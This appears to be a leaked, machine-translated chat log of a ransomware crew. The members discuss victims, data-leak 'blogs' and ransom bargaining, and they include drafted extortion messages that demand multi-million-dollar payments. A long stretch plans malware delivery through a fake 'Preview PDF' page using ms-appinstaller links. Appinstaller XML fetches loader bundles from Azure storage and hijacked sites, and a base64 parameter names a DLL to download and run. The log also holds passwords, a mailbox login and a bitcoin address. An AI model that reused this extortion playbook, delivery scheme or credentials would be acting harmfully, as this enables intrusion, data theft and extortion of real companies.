I know how they stick
yes yes you wrote i see
)) we will press everyone
the main thing is that they are in touch
here new targets entered the chats and do not write
it's strange
well bro, you know better
well, there are many places where there was no access to backup storages and they were all locked on top
why don't they write
so I can restore the system
well then it's clear why
Yes
trying to restore from backups
but there are those who are on their knees
they haven't written yet
well, let's wait
analyze
patience bro
Today we will put 2 more and then we will rest until Mon
this is for this week
cool.
will be online soon
just got in touch a little something
Yes
who should blog for?
how will they go out will you do b
Okay
well, that's what everyone should do
then I'll make the pieces
if we publish anything, they will still know where to write
Are there large networks here?
INT-MYCHOICE
462M
SOLERPALAU
DTSEE

damn bro
you saw the cue ball fall
ass
TECHNORD - still good
I have almost saved up for a square
and then fuck it, such a collapse
did you email?
Yes
crypts
well it's normal
do not rush
will grow back
you know what bothers me?
why is this box with a Russian name and surname???
miroslavpopov1980@outlook.com
doesn't that bother you???
no, how did the reverser subscribe
only go through the torus to the proton
Yes, sure
he was sitting inventing mail
thinks about how to name the post office when I'm talking to Russian hatsiks!)
Russian names googled and came up with
maybe it's a russian negotiator
who works there
went to a foreign land found himself in the field of negotiations
they are also not stupid
have you been in yuce yourself?
ner
No
Never was
were you?
well, everything is fine
I studied in england only
don't be embarrassed
rk
were you? - no, I'm not going to, I watch movies)
in general, I would have destroyed all these Anglo-Saxons and Austro-Hungarians a long time ago) but there is no such possibility
why )
I can't stand them because
we have a lot of chocks
these are what they did to you)
chucks are different
well, that's the fucked up one
history friend, history
But they didn't do anything for me personally.
ru is the country of the third myrrh because of this garbage
I look at the nets .... you fucked 3 Germans
Yes
hard
there will be troubles again)
they are all greedy bitches
i was in germany
well, I hope the abus will not arrive again
illegal immigrant near Munich))
well, how is it?
norms
collected bottles
to live
Well, we all did this when we were kids.
in short a great experience)
I'm not a child
all these grids - will they knock on the new panel?
understood, well, it means that you have now found the place of work that you need
we are all simple guys from very simple families lived badly, etc.
that's for sure!!! the main thing is that your team does not fall apart and stop working
everything that was with you was with us
so I understand you
we will fall apart only when I say ENOUGH! =))
Well, when are you going to say it?
hopefully not soon?
I understand that it is not infinite
we will leave together
while there is no kipish in ru for this work, then we are working
as they begin to mount, we'll curl up
OK
I understand
well then you'll get together anyway
how to calm down
We'll see
but this topic is long
it will take a few years
those who are the founders, they left the topic a long time ago
earned
well, yes
represent
but leaving people is also not good
before covid it was many times higher
Yes
I can't stand kicks at all
well, anything can happen.
they are the founders
they left beautifully
they could take their own as they helped a lot of people to earn money and showed everything
well, I haven\u2019t heard much about them, in general, in general, in my life - I don\u2019t like liars and threw
I don't blame them
gone, but then they left the topic and we are now feeding from it
Yes
I have earned more this month with you than in 10 years
well, yes
Well, I probably exaggerated.
this is normal
for 5 exactly

buy an apartment
you can go get a mortgage
squares for 120-140
better for cash don't take take it through the bank
not yet, I can't
Yes
I will go through the bank
otherwise the tax office will take me by the ass
Well, you still need to find, etc.
Yes
I had 24k debt, I almost paid off, so the cue ball bitch fell at the wrong time
it's just not on time
Yes wait
and so far I have 80k on my account
everything will fall into place and it will be even better
at least another 40k and you can already buy a square
I have other numbers on the screen and then I don\u2019t worry so much
well, yes
the larger the amount, the greater the loss
just like growth
well you probably already have everything
pure hobby left
and I still drive a polo in 2011))
maybe
I\u2019ll rake with a square and change the car

Hey\njust went online
today I'm finishing (didn't have time to do everything over the weekend, I had to cut a lot)\neither tonight later in the evening, or tomorrow morning I will be ready to start)
forgot again)
Hey
here?
what do you think to answer SDIGC
ok, I didn't even start today because of this
do not want to raise the price higher than 1.130.000
Hey
yeah right\nto fly nowhere\nlisten, I answered your message on Friday late, you didn\u2019t answer me, you need to decide one moment
[12/03/2021 23:01:08] <best> sorry for the long answer, I had to step back abruptly\n\nat the moment I'm keeping an eye on html and internals\nI also transfer the bots to the guys for work (but I think I will ask another person to do this so that everything is faster)\n\nhtml let's think:\nin fact, I always update 2 parts - html land (there is a link protection inside the land) and appx files (the html land is pointed to these files)\nappx files I add to azure and sometimes Mikes delete the server on azure (when analysts complain) and therefore I have to update the html land itself\n\nin order to do everything correctly, ideally, I would only update appx files without touching the html land\nfor example, it can be done in the landing so that when it is opened, a request is sent to some server, from there a response is given with a link to appx files and they are substituted into the button on the landing\nthen it will be possible to dynamically change the appx files of the host without even changing the html of the landing itself\n[12/03/2021 23:01:45] <best> either work as it is now, when Mikes delete the azura server, I update the html land and update the appx files and then send you the html land, and you already change it and everything starts
i read yes
html suits me, threw off I uploaded
7
2+2+3=?
that is, while it works the same way according to the second option?\nwhen they deleted, i re-download everything and send you the link, right?
more precisely, I\u2019m not sending a link, but a new html landing
Yes
I, in turn, update my links with a new html, which I tried and worked again
make a blog about them
OK)

Look
well
there the negotiator fucked up
I'm thinking of sending something like this.
I'll send it now, 10 minutes)
So, you won't raise your offer anymore?\nIf it is too hard for you, I will ask in another way: can we already publish ALL your data?\n\nP.S. for the company top management:\nYour negotiator looks like a low-class bot. He says the same words and don't do anything to solve the situation. We advise you to fire him, he is useless at all. We both know that you wouldn't restore the data, no one did it yet. We both understand the consequences of the data publication. Hope you understand that we offer much more easy solution.\n\nSo, our word is next:\nLAST PRICE is 2,600,000. We warn ahead - there will be no more discounts.\nAny attempt to decrease the price will result in a price increase.\nWe are tired of this useless time spending. Think several times now.
give them the last price
now
I will read
let's make $3,000,000
let's try

you can try to insert this html directly into the letter, let's see how it will work and whether they will put it)
think how to do
oke

like the bots went well and again silence
gotta check the line
An error occurred while accessing the file from the Internet. Try downloading and opening the file locally.
[18:27:00] <veron> like the bots went well and silence again\n[18:27:06] <veron> you need to check the landing

yep, the first one got screwed
very fast this time
it's time to leave Azura, otherwise it's some kind of garbage
snapping too fast
pancake ((
can you update the link?
I think there are no bots
I will quickly make a spare
Yes
let's
it is obligatory on an azura all?
I said about this that everything needs to be stored on shells, they are locked longer
if I understand the logic correctly
54GFQw#G$H^WFdwDEAW\nhttps://privatlab.com/s/v/pwWXJlExL7C9EJRgGGEN
on, it's good that the spare did)
in general, initially there was a task on Azura, because it was necessary to bypass the corps well\nbut since your letters also fly and they throw at the shell that is not on the azure, I think that you can refuse it
In general, I\u2019m thinking of leaving for my part these fucking servers and other nuances, and give you everything along with the landings)
in short, I think that's how to do it right, I think today I will decide this moment too
[18:32:55] <best> 54GFQw#G$H^WFdwDEAW\nhttps://privatlab.com/s/v/pwWXJlExL7C9EJRgGGEN\n\nthis is a landing on the same backend, on the first one)

volume can be done
let's think about what we need to optimize so as not to get stuck like this with blocks
but you need to think over a non-killable landing and a quickly restoring one))))
))))
on trial, I need to keep everything on the shells
draw me a diagram again
like what is loaded from where, I haven\u2019t really delved into it yet
or main files, separately on shells, and html separately
conditionally until they reach Thailand by phone to the admin, everything lives with us for 1-5-7 days
I have a feeling that with clicks for ddos I was issuing your scripts there)))
a lot of clicks, and hits
21,773k\n\n\nin an hour and a half
look, I'll tell you a little problem, and you tell me if you can solve it)\n\nthere are 3 parts\nhtml, appxinstaller and appxbundle\nmy loader and your load is loaded in an appxbundle file, but to run it so beautifully, you need an appinstaller file\nand so that the appinstaller understands which appxbundle (from where) to load it, inside this appinstaller file there is this line:\nUri=\"https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle\" />\nthis is a static link (that is, you cannot insert a php script that would give this file, it must refer specifically to appxbundle by file extension)\n\nand also there is such a link (in the appinstaller file):\nUri=\"https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller\"\nHere appinstaller refers to itself (because it must be exactly on the web in order to be loaded)\n\nwell, the html file itself, inside of which there is such a button:\n<a href=\"ms-appinstaller:?source=https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller\" id=\"btn\" target=\"_self\">Preview PDF</a>\n\nAs you can see, appinstaller refers to itself and to the appxbundle file, while the html file only refers to the appinstaller file\n\nSo, I wanted to host everything on shells, but there is a small problem: dynamically in html, I can get the current url at which the html file was opened (for example, https://shell.com/index.html)\nand if I put an appinstaller file next to it, I can simply take the current url through JS, cut it off, substitute it at the end of the appinstaller file and refer to it\nso the first question is solved\n\nbut appinstaller must link to the appxbundle file and to itself, so you need to change the links in it too
OK.
Hello. Horse takes. Reverse while Zeus is working out
Notes put
Hey
pongyal
where is horse
didn't see it online
Zeus has a lot of bots?
and here is the question - you can automatically determine the url on which the shell is located, change, for example, links in index.html (1 link to appinstaller, https://shell.com/file.appinstaller), in the appinstaller file (2 links, one on itself https://shell.com/file.appinstaller and the second on the appxbundle file, https://shell.com/file.appxbundle) and then upload them
?
Yes there is too
Online
certainly can
just need to fix
Yes
where is he))
funny
work went on there
bots are coming
grids go
and, well, I understand why there are no launches))\nthis time they revoked the intermediate certificate in 3 hours)))
dooms does not have time to work out
fuck how fast of course))
I told you ((
stop)
?
stop)
not to fuck
Wrote him
let's file as needed already and we will pour normally and calmer)
we\u2019ll set up your lenb and my spam will be fucked up)
yes they will definitely be fucked
we just need to tune in a little with you)
really)
bots instantly go, you can see
if i don't wait for it
ask
does he take all the bots
in admins
veyron
and what are the results in terms of grids
who take
OK.
let's see what comes out
from all this
in the news everywhere
trumpet
yeah
about emotet
and flash landing
twitter is all messed up
))
[19:05:07] <veron> of course I can\n[19:05:15] <veron> just needs to be corrected\n\nthis is super\nthen let me today, instead of messing around with landings and damn azure, I\u2019ll just write you a more detailed technical specification, prepare scripts and show you exactly where and what needs to be changed, and you, for your part, will file auto-correction of files and upload to shells, and that\u2019s it)
hors what
then absolutely everything will be hosted on shells
did you change the toad?
in the ogongia of paranoia?
stop spam now, once again I will read everything calmly
Yes changed
the only nuance that you just saw is that they can revoke an intermediate certificate (before that, you and I had enough for 2 days of it, now it\u2019s enough for my tests yesterday + spilling today for a couple of hours)
pour coffee
((
and then I have to update the appxbundle file itself with a new certificate\nbut there are no links in it, so I can send it to you a new one right there, and you just pour it into shells by the same names and that's it, continue pouring :)
yeah, that's what i was talking about at the beginning.
trump, VWkYI95vHZxIHk07m6dZiLCJHeP0OA7b4Jl5ywtTJ2RGGJwWW95KiGUcrCLG0qZB
want to know the amount
but you see, in order to throw it at you like this, I need you to file your system so that it processes these 3 files and then uploads them to the shell)
write 30 minutes
sorry, I was so counting on catching up with US today)))
then there will be no issues with Azur and landings from me\nI will monitor the certificates, the cleanliness of the files and periodically update the appxbundle files for you to continue pouring)
prepared)
everything will be, I'm sure)\nwe\u2019ll still catch up with more than one thousand pure yuses tightly)
and I need your advice, how much SRY to lay out the percentage approximately?
hahahaha
rubbed me
how he is not afraid of anyone
offline
and then the toad changed
)))))))0
blah)) I'm dying
and then they oh .. whether on the board
and you can now do that what prospamil gave them a dll)
))
I would like to know
how does he get away
killer
or so
for some %
many comments?
in admins
what did he take to work
tell me plz
haven't watched for a long time
I'll check right now
damn, i'm going to try)\ntheoretically it will work\nyou changed the link everywhere to the last landing that you threw, right?
Yes
I'll try now, I'll tell you in 5 minutes it will work out or how)
by the way, it is also necessary to obsufify the html, I will do it
OK)
1. <a href=\"ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller\" id=\"btn\" target=\"_self\">Preview PDF</a >
to change this in html?
where else can you tell me?
ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller\"\n\nhere we will point to a local folder, next to it will be 2 of your files
There are no comments in the first admin
I see what's in the second
ask horse and dave
https://i.imgur.com/aEnyme5.png
do they comment
and where
By the way, your dll is sleeping
)) plz
right now)
THX
OK
stop, damn it))
Khors said today that he had not yet marked
this is on the second backend
minute
I saw that they took a couple of bots to work
yes i know they clean
An error occurred while accessing the file from the Internet. Try downloading and opening the file locally.
yes I see))\njust updated the file and they cut me a server azur)
in short, it will be very steamy to update now, to be honest
OK (
Look
<daiverjm> talked to him about this yesterday)\nyes, today I will mark the bots, I don\u2019t have time in any way
yes, back to html
let's take turns
1. html
yeah
what to change here?
just this:\n1. <a href=\"ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller\" id=\"btn\" target=\"_self\">Preview PDF</a >
[19:21:27] <veron> 1. <a href=\"ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller\" id=\"btn\" target =\"_self\">Preview PDF</a>\n[19:21:37] <veron> change this in html?
not a problem
it should basically be:\n<a href=\"ms-appinstaller:?source=https://shell.com/file.appinstaller\" id=\"btn\" target=\"_self\">Preview PDF</a>
woo
I can even now do it without correspondence

file.appinstaller - the name with which the appinstaller file lies next to it (you can call it whatever you want, the main thing is that it has the .appinstaller extension at the end)
the locomotive swears at you too ..
further what
?
let me send you the appinstaller and appxbundle files as an example and show you what to change :)
By the way, send it to me, I'll check it right away

))
Further ?
installer inspired
look, there are Uri links in it 2
first:\nUri=\"https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller\
yeah
change here\noriginal:\nUri=\"https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller\"\nwhat to change to:\nUri=\"https://shell.com/file.appinstaller\
not a problem
Further )
and there is also a second Uri\nUri=\"https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle\" />\n\nit has the same situation\noriginal:\nUri=\"https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle\" />\nwhat to change to:\nUri=\"Uri=\"https://shell.com/file.appxbundle\" />
OK
Further
That's it, that's all you need to do :)
I'll do it in manual mode for now
and html new zalyu, will it work?
if the certificate is revoked or the appxbundle file is locked (something inside is locked there, which is rare), you will need to upload a new appxbundle file and change one more line in the appinstaller:\nPublisher=\"CN=Kolpin LLC, O=Kolpin LLC, S=Moscow, C=RU\"\n\noriginal:\nPublisher=\"CN=Kolpin LLC, O=Kolpin LLC, S=Moscow, C=RU\"\nnew:\nbut here I won\u2019t tell you right away, because here is the certificate data and only at the time of transferring the appxbundle I will tell you what data to write here :)
Okay, I'll post it there, let's see, is Sert alive at the moment?
no, it's already a dead sert\nlet me give you an appxbundle file with a new certificate and give you a new Publisher string, we'll check it right away :)
let me post the files for now
let's
new publisher:\nPublisher=\"CN=Neyros LLC, O=Neyros LLC, S=Sankt-Petersburg, C=RU\
6wFTRHg34f%$#ahg$agE\nhttps://privatlab.com/s/v/YOj57MolxAu4BlYM66BM
this one with a norm certificate\npurely theoretically, you can now check if everything works out - you can quickly update even on current shells to your shell with an installer and installs will go)
do
I'll leave for 7 minutes
I'll eat quickly, otherwise I didn't eat anything at all :(
the locomotive swears at you too ..
do you need an explicit indication here?\n\n\nUri=\"https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle\" />\n\ncan it be so?\n\n\nUri=\"ttps://tienda.alfrio.cl/Navajo/EMLpuzI7tf/\" />
let's check without explicit
I did not check this, whether it is explicit or not\nbut most likely explicit
https://tienda.alfrio.cl/Navajo/EMLpuzI7tf/
specify in html
check
<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<AppInstaller\nUri=\"https://tienda.alfrio.cl/Navajo/EMLpuzI7tf/\"\nVersion=\"1.7.0.0\" xmlns=\"http://schemas.microsoft.com/appx/appinstaller/2017/2\">\n<MainBundle\nName=\"0ee15e3a-14e9-4145-b9ca-bc4886c686d0\"\nVersion=\"1.7.0.0\"\nPublisher=\"CN=Neyros LLC, O=Neyros LLC, S=Sankt-Peterburg, C=RU\"\nUri=\"http://jkla.com.br/wp-content/a5kV/\" />\n</AppInstaller>
did it like this
check pliz
minute
no, it didn't go that way
Can you explicitly specify the files?
sec
Yes
paranoid
Hey
like you
bots are coming
do you put comments?
so you need to rewrite
I thought you can specify a redirect)
Hey
and it\u2019s like the appinstaller pulls up the norms file, but appxbundle doesn\u2019t\nUri=\"http://jkla.com.br/wp-content/a5kV/\" />\nhere it seems to be a bug)
although I'm not sure, maybe it's not complex :(
sec
link working
the link is yes, but it apparently waits for an explicit indication of the appxbundle file
not such a return)
can you fix it now?
I have everything sharpened for work, I'm afraid to screw up (
I have nothing to fix\nthis system requirement, and not because I wanted to :(
OK
the installer, as I understand it, tightens exactly
Well, the appinstaller file apparently pulls it up, but the appxbundle doesn't want to...
i.e. this pulls up:\nUri=\"https://tienda.alfrio.cl/Navajo/EMLpuzI7tf/\"\n\nbut it doesn't seem to be:\nUri=\"http://jkla.com.br/wp-content/a5kV/\" />

- if we write in .appinstaller\n        Uri=\"https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle?param1=https://some/some/1.dll\" />\n\nthen the bundle will be able to get https://some/some/1.dll and download it?
doesn't digest parameters like this :(\nand what, the option with a nearby lying dll, does not fit?
thought to simplify
I would gladly offer it right away, but he does not digest the parameters :(
maybe I'll download it today, prepare a bundle just in case
OK)
yes yes, they did everything in beauty
that's how it should be

yes it seems to be ok in general

Hey
\nI paid for Wirt with a Yumani card, for purchases they need a code from a notification in the application, but this verification did not work with itlds, apparently the payment went through without a code, in the end it did not count and a day later a refund came, and the invoice was opened again. I paid from another card now so that the server turns on faster, I only made payment with cue ball with this server once, the rest of the time I raised it urgently with a card
reception
it\u2019s just that until I get out to pay only in cue balls - it\u2019s not always there, I try to catch the stubble of the day, but the payments hang. I understand, then you can contact you, but if I can, then I try the card

I would throw the blog on their shoulders
that's why I'm always not a supporter of writing 10 times more data volumes
How'&nbsp;d you take 270 GB? That seems like a lot. Not sure how you could'&nbsp;ve done it.
let's remove it altogether in the future, replacing it with the words a lot, big, etc.
Hey
here
?

listening)
help pliz
trump as always
wind up, and then fuck then
go here How'&nbsp;d you take 270 GB? That seems like a lot. Not sure how you could'&nbsp;ve done it.
LL_main
we only have 27GB
he fucking wrote 10 times more
the company itself did not have so much campaign
so why piss off like that?
what do you think?
I have a couple of options for what to write
1. either they made a mistake with 0 and we really only have 27
or second
here is a part of the file tree of your data that is on one of our servers
Well, something like this
now it\u2019s just difficult to get out, when, as I understand it, they didn\u2019t have so much data))
tell me it's not a problem
what do you say?
what to broadcast then?
ku
just company - have you seen the rhubarb?
3.5 billion
you can't mess around here
already started with this
fucking
Yes
and we charged them 25 million
fuck off
Trumpych said not to throw off at all
and broke wood here
I'm consulting with you
in terms of not throwing?
he does not answer)
is it okay to send them?
in direct
No
well at least shorter
the bare minimum
well fuck
well, damn
but not about that
shcha at least steer
what about the second option?
in that case i would give the sheet said that part
or offer yours
well, that's what I'm for
only later if another sheet is requested
I will sit in the ass
then you can leave

I have already started
how it goes there
gut
no time at all
fuck from all sides
by the way, today he told trump that I have been working with him for 1.5 months, isn't it time to raise it to 1%
he replied that he would talk with Reshaev
And what do you think they decided?
ahah
didn't fucking decide

and all the garbage that I work for three
well you be ready
I will leave in the spring

yes, I don\u2019t live until spring bro
well, fuck him with such a schedule
ahah
so I'm up to ng
Well, I won't be in January
then probably all
almost to the end
you won't earn all the money
but health is one
no amount of money can buy
it's true
yes, they are alive
they are unlikely to raise me
well, I'll go go to the decoy
to my place
there's a hell of a team
well, then we'll decide
and here he rides me
and still unhappy that I fuck in the evening for a couple of hours
while I pick up the child from the garden
it's fucked up, yeah
so I'm not quite happy here, of course, how the Indian is used
Well, I really started to freak out. I simultaneously poke around in terabytes of data, I have to make blogs for all companies at the same time, I post gigabytes of information on sites for those who have not paid, and I also have to have time to answer in all panels)))
also for 0.5%
they probably neighing there fucked up, they found an Indian
damn, we have separate people doing this
well, then fuck some people if there is an Indian
so you understand that the grid is large
and it\u2019s impossible to pump out a little from her
Well, I understand ... but not not 10 times more to say))). okay, I consulted with Skippy, we decided to go as we did. we'll see there. because as I understand it, the company itself was crazy about such a volume and doubted whether they had so much data)
It means the approximate amount of data. I can give you a part of the file tree, if you want of your data to appreciate.
give them to skippy
he does everything
they forget about 270
OK ?
so I consulted with him
before writing
they are too big for you
give me skippy
you are the boss
told him everything
what was under his strict guidance
they need to be throttled, but no, I can provide you with part of the file tray
so what are the answers
they need to be torn apart
Well, then I don\u2019t go there, let it break
auf
Yes
where is he)
I will learn at the same time
well, it's up to him
everything I did for my part\nnow I'm waiting for you when you roll out)
ok, I\u2019ll pump it out, write down how it will work on your part
ok, now I'll test the final one for myself and write it down)
By the way, you can hide my message, they haven't read it yet
Well, I hid!
write something there plz
I have hidden my message
they haven't read it yet
shcha
pliz write here gXLy5m5Y5WPMpKVdSvacdMbEA5T81UcM34pC3WoyBweqeBFkIiCPdE4snQUA5lik, guys are waiting for the amount
By the way, there are reproduction modules, I don\u2019t know if you are aware or not, when they are loaded, you can run these modules on the same day, they are updated every day
work on both workgroup and domain
everything works for me)\n\nin short, the scheme is as follows:\nin html land in this link:\n <a href=\"ms-appinstaller:?source=https://datastorefiles.z13.web.core.windows.net/cnmnghdaeo.appinstaller\" id=\"btn\" target=\"_self\">Preview PDF</a>\n\nyou can now pass parameters in a special way to the .dll that you want to load\nthis way you can give different dlls on different landings and share them according to your backends too\n\nwhat the link looks like when you pass the link to the .dll:\n <a href=\"ms-appinstaller:?source=https://shell.com/file.appinstaller&activationUri=custom-params:?data=https://host2.com/file.dll\" id=\"btn\" target= \"_self\">Preview PDF</a>\n\nand file storage, as discussed - html land in one place, and appinstaller and appxbundle files in another (as I said before, so that there is an explicit indication of them)
&activationUri=custom-params:?data=\n\nthis is a mandatory part that cannot be changed, because this is a prescribed rule by T-shirts and the installer statically parses it
I will also throw you an appxbundle file and certificate data\nthere are no internal changes)
if you have removed the shells from where the dlls are downloaded from, I don\u2019t need to rebuild the appxbundle file, because the link there is statically not protected and is now transferred from the landing, from where to download and run the dll
excellent) accepted
if you want, you can transfer the link to the .dll not in its pure form, but you can encrypt it in base64, for example, and I will decode that's all)
just say it now, because I need to do such things in the software right now)
let's base64, it's safer
I will encrypt
OK\nthen I'm in the data= parameter to wait for a link that is encoded in base64\ndecode, download dll and run as before
Will you have time to roll out today or already on Mon?
or on the weekend?
I want to test before the strait that everything is ok)
think monday
OK\nif you have time, it would not be bad for that chip with cmd commands that you threw
I'll try to link faster
as it is necessary to do more before the holidays
yeah

Hey
rw0J6Ap3LZNfxsJyo6UpClQbrgD1dzRjxZLVZep0QQEFdl01ihbHIkEvZt91EvtA - this explains the huge amount
because they are lawyers and they pay
500 for sure with them baser
now they will start crying that they don\u2019t have so much
lawyers just know how to underestimate their income
not to pay high taxes
there are many dates
they came
whoa
whoa
beta atlas accepted\n\nkosh for sn me bc1qve3zp5w6x858wz6v0ydxxyyktgjm4vyfja5ehz
Great
on lawyers then I\u2019ll start making a blog
on lawyers blog made them threw off. probably they should also send a link to the blog to their mailbox, which they indicated and a brief request to return to the negotiation panel.
Hey
Sent 200$
can you 100 more
and don't worry until Thursday. I can start crypto now
Dokinul

Have you emailed lawyers? something tells me they won't come out
you need to drive them into the panel
nope
what for
they will come anyway)
well, let's see
1kk for them fucked up how much
well this is an experiment
OK
you can take a lot from lawyers
I don't know, just your experience
because they pay almost everything
not almost all
well, the word is almost at the end .... somehow not very
I have not yet seen a single lawyer who did not pay
well, let's see
but something they are not in a hurry to us
maybe on Monday there will be a stir
we'll see

all on mon
OK
then in touch, I am here periodically
almost 70%
today and tomorrow
I spam today and went about my business

Hopefully, they will understand. The company revenue is under $100KK. This is not a large organization. Let me know what you can do.\n16:18\n\nbut if you have data on their cyber insurance and maybe they have a lot of money in the account, they need a bank payment, then I can bargain\n16:19\n\nI will be by 21-00 Moscow time online\n16:20\n\nfor now, dig into the documents and see if there is insurance and bank statements
OK
mail give with which you wrote to them
now
but if you have data on their cyber insurance and maybe they have a lot of money in the account, they need a bank payment, then I can bargain
you need to dig through their files
grolly26@protonmail.com : steah&%*$**jfh648
ok, I'll finish the blog now
and I'll go and see what they have there
Well, did you check your mail?
Yes
well, you sent them a link in the chat
Do you have any distrust of me or what?

well of course
I don't agree with 1k

trump, and if you have no confidence in me, then a specific Indian)\n did not understand
well you keep checking me
don't you trust me?
when such money and people from the street came in who had never seen such money, how can you trust them 1000%? I have been working here for more than 15 years and have not seen anything else
so sorry but i will always double check
Well, in vain you are so, I immediately told you that money is secondary for me, people and attitude are more important for me
this is normal!
that money is secondary for me - I can\u2019t even say that) at least everything is fine with me)
well, time will tell.

No

by the way, how much do you think you can really get off a lemancorp?
can immediately tell the negotiator that, dear, you can shit all the way here, but we won\u2019t go for less than 5kk and that\u2019s it
Yes
k55 i wrote that
and to the pantner in the next panel he wrote this
Well, that's great
I think this negotiator has already negotiated with us

you see, and this freak does not want to say anything to the company
no way
I asked

Damn, I had a problem with my computer, I set up a new laptop and screwed up something so that everything stopped running altogether
in the end, I ran for another laptop for the time being, found a backup from September, and now it started up somehow
I tried to do all this as quickly as I could, but in the end I hardly sleep here for 3 days, it seems that I\u2019ll just set everything up - some kind of garbage pops up. Either vpn didn\u2019t start automatically, then I overdid it there with security that no programs were launched, but right now it\u2019s a fiasco in general ..
10 times reinstalled the OS, VPN and all the software, everything was set up, everything is ok. I start running virtual machines - could not open C:\\...VMware\\x64\\PXE-E100E.ROM (cannot find the specified file) and then immediately could not open C:\\...VMware\\x64\\PXE-BIOS. 404.ROM (The specified file cannot be found)\n\n\nNone start...\nIn a panic, at first I was worried that I would let you through and not find you - and we have a RFP today according to plan. Then I couldn\u2019t fucking do it, I got even more nervous - all the accumulations are in cue balls on one of the virtual machines .. in general, some kind of horror. for 3 days I slept for 10 hours at times while backups were copied there and left ..
Guilty, won't happen again
I'm still fucking as soon as I took a new laptop - I took all the work from the old one nafig
I wanted to do it better, I thought that on the new laptop I\u2019ll set everything up like a fuck, I installed 2 VPNs, I cut off everything that could knock somewhere, etc., and I played it shorter
for a long time ?

in the end, I ran for another laptop for the time being, found a backup from September, and now it started up somehow
Damn, I had a problem with my computer, I set up a new laptop and screwed up something so that everything stopped running altogether
I tried to do all this as quickly as I could, but in the end I hardly sleep here for 3 days, it seems that I\u2019ll just set everything up - some kind of garbage pops up. Either vpn didn\u2019t start automatically, then I overdid it there with security that no programs were launched, but right now it\u2019s a fiasco in general ..
10 times reinstalled the OS, VPN and all the software, everything was set up, everything is ok. I start running virtual machines - could not open C:\\...VMware\\x64\\PXE-E100E.ROM (cannot find the specified file) and then immediately could not open C:\\...VMware\\x64\\PXE-BIOS. 404.ROM (The specified file cannot be found)\n\n\nNone start...\nIn a panic, at first I was worried that I would let you through and not find you - and we have a RFP today according to plan. Then I couldn\u2019t fucking do it, I got even more nervous - all the accumulations are in cue balls on one of the virtual machines .. in general, some kind of horror. for 3 days I slept for 10 hours at times while backups were copied there and left ..
I'm still fucking as soon as I took a new laptop - I took all the work from the old one nafig
Guilty, won't happen again
balzac is looking for you
for mango acc in 6g santi - designer
I wanted to do it better, I thought that on the new laptop I\u2019ll set everything up like a fuck, I installed 2 VPNs, I cut off everything that could knock somewhere, etc., and I played it shorter

If you say that 40,000,000 is an unrealistic number, then I think you have a counteroffer that can satisfy both our sides.\nIf it is so, please let us know.\n\nWe gave you a lot of proofs, so you now have no doubts that all we said at the beginning of our negotiations is true. We have a decryptor for all your systems and a lot of interesting and sensitive data from your servers. Moreover, we can solve all your problems and point where to enhance your security systems. So you understand that your offer must be very satisfying. We are ready to make steps forward, bu we will not give you a large discount.

lazy) a month relaxed him
no business
they were sitting
month and a half
and one more command (reverse) seems to work, right?
How are their results?
didn't ask
learn from Bentley
let him ask
reverse is very strong
in terms of raising rights
he once taught dooms
a couple of years ago
also sensible
Bentley pull supposedly chtol how is it
he will bully others
okay)
right now you
understand
who are you
through hard work
and you will understand
what pots
not gods
burn
)))
maybe even overtake
smart top hackers
teams
do not be surprised
their motivation drops during the holidays
you are hungry
and they are full
they are in the subject on enthusiasm
already
for a long time
but sometimes
and they decide
relax
fuck off
)))
and here you have a handicap
how to free yourself - write)\nto know the status, how and when the launch)
why did they lower it to 30m?
50 was
are they there, fucked up?
let them fuck their offer

hi bro
now the basis of the gap is this one
this fag doesn't want to propose
just don't want to
avoids answering
Yes
well i texted him
let's see what the answer is
saw yes
how do you think
Now, if you really tell him that, like, if they manage to pay before Christmas, then we set them the amount of 8 million, if not, then the price will return back to 30 million. Do they agree, do you think? we just have 4 days left, if we don\u2019t start laying out the date, then we are suckers and we don\u2019t keep our words. if we post the date, then fucked up, we will lose the loot and not small) we will have a dilemma
need to talk to trump
either we rip them off or pull the strap xs how much
what do you think?
xs
trump says pull
but damn
not sure it's great
yes i'm pretty sure it's not cool
can burn out after the holidays and all
+++
Well, let's wait for Trump and he can clarify it again
just if they at least traded
and so he just rejects the crazy figure and that's it
we will stagnate in place for a long time

Hey\ncan you at least open 1 admin panel for me, which is m5px4\nI\u2019m personally fighting with one grid there, I\u2019ve been trying to break into it for 10 days now, and I can\u2019t gain a foothold in it, but your bot lives normally)
I, unlike others, write information to you, if there is a new one, and put comments on the grids)
I don\u2019t want to just lose this grid, it is very large, even very large
I'll open the links as soon as I finish

We are glad that you understand that your situation is not so sunny as it can be. Also, I think you understand that every day of negotiations will bring more and more losses, maybe even exponentially, so yes - you will gain a profit if you cooperate with us.\n-\nHowever, 900,000 USD is not an satisfying offer too. We said our word - we are not interested in such a numbers. Try your best and raise it.
can be said - the proposal is close to 7 zeros?
like 8-9 million and let them fuck

these are the guys .. if you are generally interested in the topic of banks, then in the future I will transfer to you ..
I just slowed them down as best I could, but they were already running out of time, so I gave them Zeus ..
I will talk with my friend who exactly fucked the banks
it became difficult enough there because the garbage has been coming out with unlims lately

in short anyway we have time until N.G. I told Trump that I won\u2019t be able to work until 30, only after the 2nd. so if we don\u2019t promote them to at least some amount we need before NG, then fucked up. the process will be out of control)

apparently someone leaked the info from the old chat
the blog needs to be redone so that no one sees it at this link and give them a separate
i delete now
reception
I didn't screw up anything
dont yell at me
someone leaked info from them
hi, did you find them all?
Hey
need hls
I didn't screw up anything
dont yell at me
someone leaked info from them
yes, I didn't understand sorry
I deleted my blog
new made
I thought you were mowing there again, it was already like that
well of course
I'm the scapegoat
it's good that he apologized, otherwise I already thought to spit and leave nah
the blog is fucked up
can't log in, can't do anything
